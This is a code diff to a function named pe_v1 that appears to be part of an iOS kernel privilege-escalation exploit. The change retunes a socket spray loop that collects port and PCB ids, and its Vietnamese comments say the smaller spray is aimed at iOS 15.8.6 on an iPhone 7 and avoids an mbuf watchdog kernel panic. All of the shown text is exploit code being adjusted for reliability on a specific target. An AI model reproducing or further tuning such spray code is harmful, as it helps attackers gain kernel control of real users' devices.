@@ -589,9 +589,11 @@ void pe_v1(void)
 		socketPorts = [NSMutableArray new];
 		socketPcbIds = [NSMutableArray new];
 		unsigned socketPortsCount = 0;
-		#define OPEN_MAX 10240
-		int maxfiles = OPEN_MAX * 3;
-		int leeway = 4096 * 2;
+		// Tối ưu hóa số lượng socket spray cho thiết bị iOS 15.8.6 / iPhone 7 (A10)
+		// Giảm bớt số lượng socket để tránh làm tràn mbuf watchdog kernel panic
+		#define OPEN_MAX_TUNED 2048
+		int maxfiles = OPEN_MAX_TUNED * 2;
+		int leeway = 512;
 		for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
 			mach_port_t port = spray_socket(socketPorts, socketPcbIds);
 			if (port == -1) {
@@ -601,6 +603,7 @@ void pe_v1(void)
 				socketPortsCount++;
 			}
 		}
+
 		uint64_t startPcbId = socketPcbIds.firstObject.unsignedLongLongValue;
 		uint64_t endPcbId = socketPcbIds.lastObject.unsignedLongLongValue;
 		printf("[i] socketPortsCount: %u\n", socketPortsCount);
